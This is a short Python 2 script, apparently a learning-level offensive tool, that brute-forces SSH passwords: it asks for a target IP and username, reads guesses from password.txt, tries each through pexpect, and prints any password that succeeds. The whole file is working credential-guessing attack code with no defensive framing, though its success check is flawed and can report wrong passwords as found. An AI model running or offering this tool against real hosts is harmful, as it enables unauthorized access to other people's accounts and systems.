#!/usr/bin/python

import pexpect


PROMPT = ['# ', '>>> ', '> ', '\$ ']

def connect(user, host, password):
        ssh_newkey = 'Are you sure you want to continue connecting?'
        connStr = 'ssh ' + user + '@' + host
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
        if ret == 0:
                print '[-] Error connecting'
                return
        if ret == 1:
                child.sendline('yes')
                ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
                if ret == 0:
                        print '[-] Error connecting'
                        return
        child.sendline(password)
        child.expect(PROMPT, timeout=0.5)
        return child

def main():
	host = raw_input("Enter the IP address bruteforce target: ")
	user = raw_input("Enter the user target to bruteforce: ")
	file = open('password.txt', 'r')
	for psw in file.readlines():
		psw = psw.strip('\n')
		try:
			child = connect(user, host, psw)
			print "[+] Password found: " + psw
		except:
			print "[-] Wrong password: " + psw

main()
